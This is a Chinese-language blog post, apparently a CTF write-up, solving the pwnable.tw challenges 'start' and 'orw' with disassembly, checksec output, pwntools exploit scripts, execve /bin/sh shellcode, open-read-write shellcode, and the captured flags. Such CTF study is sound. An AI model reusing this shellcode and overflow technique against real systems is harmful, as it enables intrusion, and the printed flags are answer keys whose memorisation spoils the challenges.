@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>pwnable.tw | sir</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="此刻终于放下你 如同放下一支笔放下腥风和血雨 仇恨赶出我心里">
+<meta name="keywords" content="-writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw">
+<meta property="og:url" content="https://cc-sir.github.io/2019/03/01/pwnable_tw/index.html">
+<meta property="og:site_name" content="sir">
+<meta property="og:description" content="此刻终于放下你 如同放下一支笔放下腥风和血雨 仇恨赶出我心里">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-02-27T08:50:22.181Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw">
+<meta name="twitter:description" content="此刻终于放下你 如同放下一支笔放下腥风和血雨 仇恨赶出我心里">
+  
+    <link rel="alternative" href="/atom.xml" title="sir" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/touxiang.png" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">钞sir</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                            
+                                <a class="fl QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/writeup/" style="font-size: 10px;">-writeup</a> <a href="/tags/pwn-堆/" style="font-size: 20px;">pwn-堆</a> <a href="/tags/pwn-栈/" style="font-size: 20px;">pwn-栈</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://ThunderJie.github.io/">ThunderJie</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://optimic.github.io/">观樂。</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">我已无力接住你，再也不能抗风雨</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">钞sir</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/touxiang.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">钞sir</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                    
+                        <a class="QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-pwnable_tw" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/01/pwnable_tw/" class="article-date">
+      <time datetime="2019-03-01T07:14:52.479Z" itemprop="datePublished">2019-03-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwnable.tw
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">-writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>此刻终于放下你 如同放下一支笔<br>放下腥风和血雨 仇恨赶出我心里<br><a id="more"></a></p>
+<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>这道题是静态编译的，或者可以理解是就是直接用汇编写的，所以这个程序很小，没有可以利用的函数；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:~/desktop$ objdump -R start</span><br><span class="line"></span><br><span class="line">start：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">objdump: start：不是动态对象</span><br><span class="line">objdump: start: 无效的操作</span><br></pre></td></tr></table></figure></p>
+<p>反汇编代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:~/desktop$ objdump -d start -M intel</span><br><span class="line"></span><br><span class="line">start：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:	54                   	push   esp</span><br><span class="line"> 8048061:	68 9d 80 04 08       	push   0x804809d</span><br><span class="line"> 8048066:	31 c0                	xor    eax,eax</span><br><span class="line"> 8048068:	31 db                	xor    ebx,ebx</span><br><span class="line"> 804806a:	31 c9                	xor    ecx,ecx</span><br><span class="line"> 804806c:	31 d2                	xor    edx,edx</span><br><span class="line"> 804806e:	68 43 54 46 3a       	push   0x3a465443</span><br><span class="line"> 8048073:	68 74 68 65 20       	push   0x20656874</span><br><span class="line"> 8048078:	68 61 72 74 20       	push   0x20747261</span><br><span class="line"> 804807d:	68 73 20 73 74       	push   0x74732073</span><br><span class="line"> 8048082:	68 4c 65 74 27       	push   0x2774654c</span><br><span class="line"> 8048087:	89 e1                	mov    ecx,esp</span><br><span class="line"> 8048089:	b2 14                	mov    dl,0x14</span><br><span class="line"> 804808b:	b3 01                	mov    bl,0x1</span><br><span class="line"> 804808d:	b0 04                	mov    al,0x4</span><br><span class="line"> 804808f:	<span class="built_in">cd</span> 80                	int    0x80</span><br><span class="line"> 8048091:	31 db                	xor    ebx,ebx</span><br><span class="line"> 8048093:	b2 3c                	mov    dl,0x3c</span><br><span class="line"> 8048095:	b0 03                	mov    al,0x3</span><br><span class="line"> 8048097:	<span class="built_in">cd</span> 80                	int    0x80</span><br><span class="line"> 8048099:	83 c4 14             	add    esp,0x14</span><br><span class="line"> 804809c:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:	5c                   	pop    esp</span><br><span class="line"> 804809e:	31 c0                	xor    eax,eax</span><br><span class="line"> 80480a0:	40                   	inc    eax</span><br><span class="line"> 80480a1:	<span class="built_in">cd</span> 80                	int    0x80</span><br></pre></td></tr></table></figure></p>
+<p>可以看到程序没有什么可用函数，都靠int 0x80来执行的；<br>所以这里有两个关键函数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8048087:	89 e1                	mov    ecx,esp</span><br><span class="line">8048089:	b2 14                	mov    dl,0x14</span><br><span class="line">804808b:	b3 01                	mov    bl,0x1</span><br><span class="line">804808d:	b0 04                	mov    al,0x4</span><br><span class="line">804808f:	<span class="built_in">cd</span> 80                	int    0x80</span><br></pre></td></tr></table></figure></p>
+<p>这段汇编相当于printf函数，会把ecx的内容打印出来，可以用来泄露地址；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8048091:	31 db                	xor    ebx,ebx</span><br><span class="line">8048093:	b2 3c                	mov    dl,0x3c</span><br><span class="line">8048095:	b0 03                	mov    al,0x3</span><br><span class="line">8048097:	<span class="built_in">cd</span> 80                	int    0x80</span><br></pre></td></tr></table></figure></p>
+<p>这段汇编代码，相当于gets()函数，会有溢出；<br>检查一下保护机制：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:~/desktop$ checksec start</span><br><span class="line">[*] <span class="string">'/home/sir/desktop/start'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01思路"><a href="#0x01思路" class="headerlink" title="0x01思路"></a>0x01思路</h2><p>思路很简单,因为保护机制全关，所以我们可以直接将shellcode写入栈里面，然后返回到shellcode的地址，执行shellcode;<br>所以关键点就是泄露出栈的地址，因为汇编中有mov    ecx,esp，所以可以直接泄露esp的地址，即栈的地址；</p>
+<h2 id="0x02EXP"><a href="#0x02EXP" class="headerlink" title="0x02EXP"></a>0x02EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p = process('./start')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">put_addr = <span class="number">0x8048087</span> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(put_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stark = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"addr: "</span> + hex(addr)</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">20</span> + p32(stark+<span class="number">0x14</span>) + <span class="string">'\x90'</span>*<span class="number">4</span> + shellcode</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><p>这道题考察shellcode的编写，而且我们输入的内容会被直接当成代码来执行；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">8048571:	68 c8 00 00 00       	push   0xc8</span><br><span class="line">8048576:	68 60 a0 04 08       	push   0x804a060</span><br><span class="line">804857b:	6a 00                	push   0x0</span><br><span class="line">804857d:	e8 ee fd ff ff       	call   8048370 &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">8048582:	83 c4 10             	add    esp,0x10</span><br><span class="line">8048585:	b8 60 a0 04 08       	mov    eax,0x804a060</span><br><span class="line">804858a:	ff d0                	call   eax</span><br></pre></td></tr></table></figure></p>
+<p>但是程序有一个orw_seccomp函数，里面有prctl函数，这里限制了我们只能使用open read write这三个程序本身自带函数；<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">080484cb &lt;orw_seccomp&gt;:</span><br><span class="line">80484cb:	55                   	push   ebp</span><br><span class="line">80484cc:	89 e5                	mov    ebp,esp</span><br><span class="line">80484ce:	57                   	push   edi</span><br><span class="line">80484cf:	56                   	push   esi</span><br><span class="line">80484d0:	53                   	push   ebx</span><br><span class="line">80484d1:	83 ec 7c             	sub    esp,0x7c</span><br><span class="line">80484d4:	65 a1 14 00 00 00    	mov    eax,gs:0x14</span><br><span class="line">80484da:	89 45 e4             	mov    DWORD PTR [ebp-0x1c],eax</span><br><span class="line">80484dd:	31 c0                	xor    eax,eax</span><br><span class="line">80484df:	8d 45 84             	lea    eax,[ebp-0x7c]</span><br><span class="line">80484e2:	bb 40 86 04 08       	mov    ebx,0x8048640</span><br><span class="line">80484e7:	ba 18 00 00 00       	mov    edx,0x18</span><br><span class="line">80484ec:	89 c7                	mov    edi,eax</span><br><span class="line">80484ee:	89 de                	mov    esi,ebx</span><br><span class="line">80484f0:	89 d1                	mov    ecx,edx</span><br><span class="line">80484f2:	f3 a5                	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]</span><br><span class="line">80484f4:	66 c7 85 7c ff ff ff 	mov    WORD PTR [ebp-0x84],0xc</span><br><span class="line">80484fb:	0c 00 </span><br><span class="line">80484fd:	8d 45 84             	lea    eax,[ebp-0x7c]</span><br><span class="line">8048500:	89 45 80             	mov    DWORD PTR [ebp-0x80],eax</span><br><span class="line">8048503:	83 ec 0c             	sub    esp,0xc</span><br><span class="line">8048506:	6a 00                	push   0x0</span><br><span class="line">8048508:	6a 00                	push   0x0</span><br><span class="line">804850a:	6a 00                	push   0x0</span><br><span class="line">804850c:	6a 01                	push   0x1</span><br><span class="line">804850e:	6a 26                	push   0x26</span><br><span class="line">8048510:	e8 9b fe ff ff       	call   80483b0 &lt;prctl@plt&gt;</span><br><span class="line">8048515:	83 c4 20             	add    esp,0x20</span><br><span class="line">8048518:	83 ec 04             	sub    esp,0x4</span><br><span class="line">804851b:	8d 85 7c ff ff ff    	lea    eax,[ebp-0x84]</span><br><span class="line">8048521:	50                   	push   eax</span><br><span class="line">8048522:	6a 02                	push   0x2</span><br><span class="line">8048524:	6a 16                	push   0x16</span><br><span class="line">8048526:	e8 85 fe ff ff       	call   80483b0 &lt;prctl@plt&gt;</span><br><span class="line">804852b:	83 c4 10             	add    esp,0x10</span><br><span class="line">804852e:	90                   	nop</span><br><span class="line">804852f:	8b 45 e4             	mov    eax,DWORD PTR [ebp-0x1c]</span><br><span class="line">8048532:	65 33 05 14 00 00 00 	xor    eax,DWORD PTR gs:0x14</span><br><span class="line">8048539:	74 05                	je     8048540 &lt;orw_seccomp+0x75&gt;</span><br><span class="line">804853b:	e8 50 fe ff ff       	call   8048390 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">8048540:	8d 65 f4             	lea    esp,[ebp-0xc]</span><br><span class="line">8048543:	5b                   	pop    ebx</span><br><span class="line">8048544:	5e                   	pop    esi</span><br><span class="line">8048545:	5f                   	pop    edi</span><br><span class="line">8048546:	5d                   	pop    ebp</span><br><span class="line">8048547:	c3                   	ret</span><br></pre></td></tr></table></figure></p>
+<p>但是我们确实只需要open read write这三个函数就可以了,只是需要我们自己写；<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">open_shellcode = <span class="string">"xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;"</span></span><br><span class="line"><span class="comment">#打开文件</span></span><br><span class="line">read_shellcode = <span class="string">"mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80;"</span></span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">write_shellcode = <span class="string">"mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x80;"</span></span><br><span class="line"><span class="comment">#打印文件</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#p = process('./orw')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">open_shellcode = <span class="string">"xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;int 0x80;"</span></span><br><span class="line"></span><br><span class="line">read_shellcode = <span class="string">"mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80;"</span></span><br><span class="line"></span><br><span class="line">write_shellcode = <span class="string">"mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x80;"</span></span><br><span class="line"></span><br><span class="line">shellcode = open_shellcode + read_shellcode + write_shellcode</span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'Give my your shellcode:'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span></span><br></pre></td></tr></table></figure>
+<p>或者shellcraft构造shellcode<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#p = process('./orw')</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.i386.pushstr(<span class="string">"/home/orw/flag"</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">"SYS_open"</span>, <span class="string">'esp'</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">"SYS_read"</span>, <span class="string">'eax'</span>, <span class="string">'esp'</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">"SYS_write"</span>, <span class="number">1</span>, <span class="string">'esp'</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'Give my your shellcode:'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span></span><br></pre></td></tr></table></figure></p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/03/01/pwnable_tw/">pwnable.tw</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 钞sir 的个人博客">钞sir</a></p>
+        <p><span>发布时间:</span>2019年03月01日 - 15时14分</p>
+        <p><span>最后更新:</span>2019年02月27日 - 16时50分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/01/pwnable_tw/" title="pwnable.tw">https://cc-sir.github.io/2019/03/01/pwnable_tw/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/03/01/pwnable_tw/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2019/03/01/Tcache/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Hgame2019_babytcache
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/02/22/hacknote/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pwnable.tw_hacknote</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01思路"><span class="toc-number">1.1.</span> <span class="toc-text">0x01思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02EXP"><span class="toc-number">1.2.</span> <span class="toc-text">0x02EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/03/01/Tcache/" title="上一篇: Hgame2019_babytcache">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/02/22/hacknote/" title="下一篇: pwnable.tw_hacknote">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
